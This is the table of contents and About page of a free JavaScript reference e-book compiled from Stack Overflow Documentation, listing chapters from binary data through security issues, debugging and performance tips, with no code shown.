JavaScript
Notes for ProfessionalsJavaScript®
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial JavaScript ® group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks
Contents
About  1  ................................................................................................................................................................................... 
Chapter 53: Binary Data  302  ....................................................................................................................................... 
Section 53.1: Getting binary representation of an image ﬁle  302  ............................................................................... 
Section 53.2: Converting between Blobs and ArrayBuers  302  ................................................................................. 
Section 53.3: Manipulating ArrayBuers with DataViews  303  ..................................................................................... 
Section 53.4: Creating a TypedArray from a Base64 string  303  ................................................................................. 
Section 53.5: Using TypedArrays  304  ............................................................................................................................. 
Section 53.6: Iterating through an arrayBuer  304  ...................................................................................................... 
Chapter 54: Template Literals  306  .......................................................................................................................... 
Section 54.1: Basic interpolation and multiline strings  306  ........................................................................................... 
Section 54.2: Tagged strings  306  ................................................................................................................................... 
Section 54.3: Raw strings  307  .......................................................................................................................................... 
Section 54.4: Templating HTML With Template Strings  307  ....................................................................................... 
Section 54.5: Introduction  308  ......................................................................................................................................... 
Chapter 55: Fetch  309  ..................................................................................................................................................... 
Section 55.1: Getting JSON data  309  .............................................................................................................................. 
Section 55.2: Set Request Headers  309  ......................................................................................................................... 
Section 55.3: POST Data  309  ........................................................................................................................................... 
Section 55.4: Send cookies  310  ....................................................................................................................................... 
Section 55.5: GlobalFetch  310  ......................................................................................................................................... 
Section 55.6: Using Fetch to Display Questions from the Stack Overﬂow API  310  ................................................... 
Chapter 56: Scope  311  .................................................................................................................................................... 
Section 56.1: Closures  311  ................................................................................................................................................ 
Section 56.2: Hoisting  312  ................................................................................................................................................ 
Section 56.3: Dierence between var and let  315  ........................................................................................................ 
Section 56.4: Apply and Call syntax and invocation  317  ............................................................................................. 
Section 56.5: Arrow function invocation  318  ................................................................................................................. 
Section 56.6: Bound invocation  319  ................................................................................................................................ 
Section 56.7: Method invocation  319  .............................................................................................................................. 
Section 56.8: Anonymous invocation  320  ...................................................................................................................... 
Section 56.9: Constructor invocation  320  ...................................................................................................................... 
Section 56.10: Using let in loops instead of var (click handlers example)  320  ........................................................... 
Chapter 57: Modules  322  ............................................................................................................................................... 
Section 57.1: Deﬁning a module  322  ............................................................................................................................... 
Section 57.2: Default exports  322  ................................................................................................................................... 
Section 57.3: Importing named members from another module  323  ........................................................................ 
Section 57.4: Importing an entire module  323  .............................................................................................................. 
Section 57.5: Importing named members with aliases  324  ......................................................................................... 
Section 57.6: Importing with side eects  324  ................................................................................................................ 
Section 57.7: Exporting multiple named members  324  ................................................................................................ 
Chapter 58: Screen  325  .................................................................................................................................................. 
Section 58.1: Getting the screen resolution  325  ............................................................................................................. 
Section 58.2: Getting the “available” area of the screen  325  ...................................................................................... 
Section 58.3: Page width and height  325  ....................................................................................................................... 
Section 58.4: Window innerWidth and innerHeight Properties  325  ............................................................................ 
Section 58.5: Getting color information about the screen  325  .................................................................................... 
Chapter 59: Variable coercion/conversion  326  ................................................................................................. 
Section 59.1: Double Negation (!!x)  326  .......................................................................................................................... 
Section 59.2: Implicit conversion  326  ............................................................................................................................. 
Section 59.3: Converting to boolean  326  ....................................................................................................................... 
Section 59.4: Converting a string to a number  327  ...................................................................................................... 
Section 59.5: Converting a number to a string  328  ...................................................................................................... 
Section 59.6: Primitive to Primitive conversion table  328  ............................................................................................. 
Section 59.7: Convert an array to a string  328  ............................................................................................................. 
Section 59.8: Array to String using array methods  329  ............................................................................................... 
Section 59.9: Converting a number to a boolean  329  .................................................................................................. 
Section 59.10: Converting a string to a boolean  329  .................................................................................................... 
Section 59.11: Integer to Float  329  ................................................................................................................................... 
Section 59.12: Float to Integer  330  .................................................................................................................................. 
Section 59.13: Convert string to ﬂoat  330  ....................................................................................................................... 
Chapter 60: Destructuring assignment  331  ......................................................................................................... 
Section 60.1: Destructuring Objects  331  ......................................................................................................................... 
Section 60.2: Destructuring function arguments  332  ................................................................................................... 
Section 60.3: Nested Destructuring  332  ......................................................................................................................... 
Section 60.4: Destructuring Arrays  333  .......................................................................................................................... 
Section 60.5: Destructuring inside variables  333  .......................................................................................................... 
Section 60.6: Default Value While Destructuring  334  ................................................................................................... 
Section 60.7: Renaming Variables While Destructuring  334  ........................................................................................ 
Chapter 61: WebSockets  335  ....................................................................................................................................... 
Section 61.1: Working with string messages  335  ........................................................................................................... 
Section 61.2: Establish a web socket connection  335  ................................................................................................... 
Section 61.3: Working with binary messages  335  ......................................................................................................... 
Section 61.4: Making a secure web socket connection  336  ......................................................................................... 
Chapter 62: Arrow Functions  337  .............................................................................................................................. 
Section 62.1: Introduction  337  .......................................................................................................................................... 
Section 62.2: Lexical Scoping & Binding (Value of "this")  337  ..................................................................................... 
Section 62.3: Arguments Object  338  .............................................................................................................................. 
Section 62.4: Implicit Return  338  ..................................................................................................................................... 
Section 62.5: Arrow functions as a constructor  339  ..................................................................................................... 
Section 62.6: Explicit Return  339  ..................................................................................................................................... 
Chapter 63: Workers  340  ............................................................................................................................................... 
Section 63.1: Web Worker  340  ......................................................................................................................................... 
Section 63.2: A simple service worker  340  ..................................................................................................................... 
Section 63.3: Register a service worker  341  .................................................................................................................. 
Section 63.4: Communicating with a Web Worker  341  ................................................................................................ 
Section 63.5: Terminate a worker  342  ............................................................................................................................ 
Section 63.6: Populating your cache  343  ....................................................................................................................... 
Section 63.7: Dedicated Workers and Shared Workers  343  ........................................................................................ 
Chapter 64: requestAnimationFrame  345  ............................................................................................................ 
Section 64.1: Use requestAnimationFrame to fade in element  345  ............................................................................ 
Section 64.2: Keeping Compatibility  346  ....................................................................................................................... 
Section 64.3: Cancelling an Animation  346  .................................................................................................................... 
Chapter 65: Creational Design Patterns  348  ....................................................................................................... 
Section 65.1: Factory Functions  348  ................................................................................................................................ 
Section 65.2: Factory with Composition  349  .................................................................................................................. 
Section 65.3: Module and Revealing Module Patterns  350  .......................................................................................... 
Section 65.4: Prototype Pattern  352  ............................................................................................................................... 
Section 65.5: Singleton Pattern  353  ................................................................................................................................ 
Section 65.6: Abstract Factory Pattern  354  ................................................................................................................... 
Chapter 66: Detecting browser  355  ......................................................................................................................... 
Section 66.1: Feature Detection Method  355  ................................................................................................................. 
Section 66.2: User Agent Detection  355  ......................................................................................................................... 
Section 66.3: Library Method  356  ................................................................................................................................... 
Chapter 67: Symbols  357  ............................................................................................................................................... 
Section 67.1: Basics of symbol primitive type  357  ......................................................................................................... 
Section 67.2: Using Symbol.for() to create global, shared symbols  357  .................................................................... 
Section 67.3: Converting a symbol into a string  357  .................................................................................................... 
Chapter 68: Transpiling  359  ......................................................................................................................................... 
Section 68.1: Introduction to Transpiling  359  ................................................................................................................. 
Section 68.2: Start using ES6/7 with Babel  360  ............................................................................................................. 
Chapter 69: Automatic Semicolon Insertion - ASI  361  .................................................................................... 
Section 69.1: Avoid semicolon insertion on return statements  361  ............................................................................. 
Section 69.2: Rules of Automatic Semicolon Insertion  361  .......................................................................................... 
Section 69.3: Statements aected by automatic semicolon insertion  362  ................................................................ 
Chapter 70: Localization  364  ....................................................................................................................................... 
Section 70.1: Number formatting  364  ............................................................................................................................. 
Section 70.2: Currency formatting  364  .......................................................................................................................... 
Section 70.3: Date and time formatting  364  .................................................................................................................. 
Chapter 71: Geolocation  365  ........................................................................................................................................ 
Section 71.1: Get updates when a user's location changes  365  ................................................................................... 
Section 71.2: Get a user's latitude and longitude  365  ................................................................................................... 
Section 71.3: More descriptive error codes  365  ............................................................................................................. 
Chapter 72: IndexedDB  367  .......................................................................................................................................... 
Section 72.1: Opening a database  367  ........................................................................................................................... 
Section 72.2: Adding objects  367  .................................................................................................................................... 
Section 72.3: Retrieving data  368  ................................................................................................................................... 
Section 72.4: Testing for IndexedDB availability  369  .................................................................................................... 
Chapter 73: Modularization Techniques  370  ....................................................................................................... 
Section 73.1: ES6 Modules  370  ......................................................................................................................................... 
Section 73.2: Universal Module Deﬁnition (UMD)  370  .................................................................................................. 
Section 73.3: Immediately invoked function expressions (IIFE)  371  ............................................................................ 
Section 73.4: Asynchronous Module Deﬁnition (AMD)  371  .......................................................................................... 
Section 73.5: CommonJS - Node.js  372  .......................................................................................................................... 
Chapter 74: Proxy  374  .................................................................................................................................................... 
Section 74.1: Proxying property lookup  374  .................................................................................................................. 
Section 74.2: Very simple proxy (using the set trap)  374  ............................................................................................ 
Chapter 75: .postMessage() and MessageEvent  376  ...................................................................................... 
Section 75.1: Getting Started  376  .................................................................................................................................... 
Chapter 76: WeakMap  379  ............................................................................................................................................ 
Section 76.1: Creating a WeakMap object  379  .............................................................................................................. 
Section 76.2: Getting a value associated to the key  379  .............................................................................................. 
Section 76.3: Assigning a value to the key  379  ............................................................................................................. 
Section 76.4: Checking if an element with the key exists  379  ...................................................................................... 
Section 76.5: Removing an element with the key  380  .................................................................................................. 
Section 76.6: Weak reference demo  380  ....................................................................................................................... 
Chapter 77: WeakSet  382  .............................................................................................................................................. 
Section 77.1: Creating a WeakSet object  382  ................................................................................................................ 
Section 77.2: Adding a value  382  .................................................................................................................................... 
Section 77.3: Checking if a value exists  382  ................................................................................................................... 
Section 77.4: Removing a value  382  ............................................................................................................................... 
Chapter 78: Escape Sequences  383  ......................................................................................................................... 
Section 78.1: Entering special characters in strings and regular expressions  383  .................................................... 
Section 78.2: Escape sequence types  383  ..................................................................................................................... 
Chapter 79: Behavioral Design Patterns  386  ...................................................................................................... 
Section 79.1: Observer pattern  386  ................................................................................................................................. 
Section 79.2: Mediator Pattern  387  ................................................................................................................................ 
Section 79.3: Command  388  ............................................................................................................................................ 
Section 79.4: Iterator  389  ................................................................................................................................................. 
Chapter 80: Server-sent events  391  ........................................................................................................................ 
Section 80.1: Setting up a basic event stream to the server  391  ................................................................................. 
Section 80.2: Closing an event stream  391  ................................................................................................................... 
Section 80.3: Binding event listeners to EventSource  391  ........................................................................................... 
Chapter 81: Async functions (async/await)  393  ................................................................................................ 
Section 81.1: Introduction  393  .......................................................................................................................................... 
Section 81.2: Await and operator precedence  393  ....................................................................................................... 
Section 81.3: Async functions compared to Promises  394  ........................................................................................... 
Section 81.4: Looping with async await  395  ................................................................................................................... 
Section 81.5: Less indentation  396  .................................................................................................................................. 
Section 81.6: Simultaneous async (parallel) operations  397  ........................................................................................ 
Chapter 82: Async Iterators  398  ................................................................................................................................ 
Section 82.1: Basics  398  ................................................................................................................................................... 
Chapter 83: How to make iterator usable inside async callback function  399  ................................. 
Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?  399  ...................................... 
Section 83.2: Correct Writing  399  ................................................................................................................................... 
Chapter 84: Tail Call Optimization  400  .................................................................................................................. 
Section 84.1: What is Tail Call Optimization (TCO)  400  ................................................................................................ 
Section 84.2: Recursive loops 400  .................................................................................................................................. 
Chapter 85: Bitwise Operators - Real World Examples (snippets)  401  ................................................. 
Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)  401  .................... 
Section 85.2: Faster multiplication or division by powers of 2  401  ............................................................................. 
Section 85.3: Number's Parity Detection with Bitwise AND  401  .................................................................................. 
Chapter 86: Tilde ~  403  ................................................................................................................................................... 
Section 86.1: ~ Integer  403  ............................................................................................................................................... 
Section 86.2: ~~ Operator  403  ......................................................................................................................................... 
Section 86.3: Converting Non-numeric values to Numbers  404  .................................................................................. 
Section 86.4: Shorthands  404  .......................................................................................................................................... 
Section 86.5: ~ Decimal  404  ............................................................................................................................................. 
Chapter 87: Using JavaScript to get/set CSS custom variables  406  ..................................................... 
Section 87.1: How to get and set CSS variable property values  406  ........................................................................... 
Chapter 88: Selection API  407  ..................................................................................................................................... 
Section 88.1: Get the text of the selection  407  ............................................................................................................... 
Section 88.2: Deselect everything that is selected  407  ................................................................................................ 
Section 88.3: Select the contents of an element  407  .................................................................................................... 
Chapter 89: File API, Blobs and FileReaders  408  ............................................................................................... 
Section 89.1: Read ﬁle as string  408  ............................................................................................................................... 
Section 89.2: Read ﬁle as dataURL  408  ......................................................................................................................... 
Section 89.3: Slice a ﬁle  409  ............................................................................................................................................. 
Section 89.4: Get the properties of the ﬁle  409  ............................................................................................................. 
Section 89.5: Selecting multiple ﬁles and restricting ﬁle types  410  ............................................................................. 
Section 89.6: Client side csv download using Blob  410  ................................................................................................ 
Chapter 90: Notiﬁcations API  411  ............................................................................................................................. 
Section 90.1: Requesting Permission to send notiﬁcations  411  ................................................................................... 
Section 90.2: Sending Notiﬁcations  411  ......................................................................................................................... 
Section 90.3: Closing a notiﬁcation  411  ......................................................................................................................... 
Section 90.4: Notiﬁcation events  412  ............................................................................................................................. 
Chapter 91: Vibration API  413  ...................................................................................................................................... 
Section 91.1: Single vibration  413  ..................................................................................................................................... 
Section 91.2: Check for support  413  ............................................................................................................................... 
Section 91.3: Vibration patterns  413  ............................................................................................................................... 
Chapter 92: Battery Status API  414  ......................................................................................................................... 
Section 92.1: Battery Events  414  ..................................................................................................................................... 
Section 92.2: Getting current battery level  414  ............................................................................................................. 
Section 92.3: Is battery charging?  414  ........................................................................................................................... 
Section 92.4: Get time left until battery is empty  414  ................................................................................................... 
Section 92.5: Get time left until battery is fully charged  414  ....................................................................................... 
Chapter 93: Fluent API  415  ............................................................................................................................................ 
Section 93.1: Fluent API capturing construction of HTML articles with JS  415  ........................................................... 
Chapter 94: Web Cryptography API  417  ............................................................................................................... 
Section 94.1: Creating digests (e.g. SHA-256)  417  ......................................................................................................... 
Section 94.2: Cryptographically random data  417  ....................................................................................................... 
Section 94.3: Generating RSA key pair and converting to PEM format  418  .............................................................. 
Section 94.4: Converting PEM key pair to CryptoKey  419  ........................................................................................... 
Chapter 95: Security issues  421  ................................................................................................................................. 
Section 95.1: Reﬂected Cross-site scripting (XSS)  421  .................................................................................................. 
Section 95.2: Persistent Cross-site scripting (XSS)  422  ................................................................................................ 
Section 95.3: Persistent Cross-site scripting from JavaScript string literals  423  ....................................................... 
Section 95.4: Why scripts from other people can harm your website and its visitors  423  ...................................... 
Section 95.5: Evaled JSON injection  424  ........................................................................................................................ 
Chapter 96: Same Origin Policy & Cross-Origin Communication  426  ..................................................... 
Section 96.1: Safe cross-origin communication with messages  426  ........................................................................... 
Section 96.2: Ways to circumvent Same-Origin Policy  427  ......................................................................................... 
Chapter 97: Error Handling  429  ................................................................................................................................. 
Section 97.1: Error objects  429  ........................................................................................................................................ 
Section 97.2: Interaction with Promises  429  .................................................................................................................. 
Section 97.3: Error types  430  ........................................................................................................................................... 
Section 97.4: Order of operations plus advanced thoughts  430  ................................................................................. 
Chapter 98: Global error handling in browsers  433  ........................................................................................ 
Section 98.1: Handling window.onerror to report all errors back to the server-side  433  ......................................... 
Chapter 99: Debugging  435  .......................................................................................................................................... 
Section 99.1: Interactive interpreter variables  435  ........................................................................................................ 
Section 99.2: Breakpoints  435  ......................................................................................................................................... 
Section 99.3: Using setters and getters to ﬁnd what changed a property  436  ......................................................... 
Section 99.4: Using the console  437  ............................................................................................................................... 
Section 99.5: Automatically pausing execution  438  ..................................................................................................... 
Section 99.6: Elements inspector  438  ............................................................................................................................. 
Section 99.7: Break when a function is called  438  ........................................................................................................ 
Section 99.8: Stepping through code  439  ...................................................................................................................... 
Chapter 100: Unit Testing JavaScript  440  ............................................................................................................ 
Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire  440  ................................................... 
Section 100.2: Basic Assertion  442  .................................................................................................................................. 
Chapter 101: Evaluating JavaScript  444  ................................................................................................................ 
Section 101.1: Evaluate a string of JavaScript statements  444  .................................................................................... 
Section 101.2: Introduction  444  ........................................................................................................................................ 
Section 101.3: Evaluation and Math  444  .......................................................................................................................... 
Chapter 102: Linters - Ensuring code quality  445  ............................................................................................. 
Section 102.1: JSHint  445  .................................................................................................................................................. 
Section 102.2: ESLint / JSCS  446  ..................................................................................................................................... 
Section 102.3: JSLint  446  .................................................................................................................................................. 
Chapter 103: Anti-patterns  447  .................................................................................................................................. 
Section 103.1: Chaining assignments in var declarations  447  ...................................................................................... 
Chapter 104: Performance Tips  448  ........................................................................................................................ 
Section 104.1: Avoid try/catch in performance-critical functions  448  ......................................................................... 
Section 104.2: Limit DOM Updates  448  ........................................................................................................................... 
Section 104.3: Benchmarking your code - measuring execution time  449  ................................................................ 
Section 104.4: Use a memoizer for heavy-computing functions  451  ......................................................................... 
Section 104.5: Initializing object properties with null  453  .............................................................................................. 
Section 104.6: Reuse objects rather than recreate  454  ................................................................................................ 
Section 104.7: Prefer local variables to globals, attributes, and indexed values  455  ................................................ 
Section 104.8: Be consistent in use of Numbers  456  ..................................................................................................... 
Chapter 105: Memory eciency  458  ....................................................................................................................... 
Section 105.1: Drawback of creating true private method  458  .................................................................................... 
Appendix A: Reserved Keywords  459  ...................................................................................................................... 
Section A.1: Reserved Keywords  459  .............................................................................................................................. 
Section A.2: Identiﬁers & Identiﬁer Names  461  ............................................................................................................. 
Credits  463  ............................................................................................................................................................................ 
You may also like  474  ...................................................................................................................................................... 
GoalKicker.com – JavaScript ® Notes for Professionals 1About
Please feel free to share this PDF with anyone for free,
latest version of this book can be downloaded from:
https://goalkicker.com/JavaScriptBook
This JavaScript ® Notes for Professionals  book is compiled from Stack Overﬂow
Documentation , the content is written by the beautiful people at Stack Overﬂow.
Text content is released under Creative Commons BY-SA, see credits at the end
of this book whom contributed to the various chapters. Images may be copyright
of their respective owners unless otherwise speciﬁed
This is an unoﬃcial free book created for educational purposes and is not
aﬃliated with oﬃcial JavaScript ® group(s) or company(s) nor Stack Overﬂow. All
trademarks and registered trademarks are the property of their respective
company owners
The information presented in this book is not guaranteed to be correct nor
accurate, use at your own risk
Please send feedback and corrections to web@petercv.com
GoalKicker.com – JavaScript ® Notes for Professionals 2Chapter 1: Getting started with JavaScript
Version Release Date
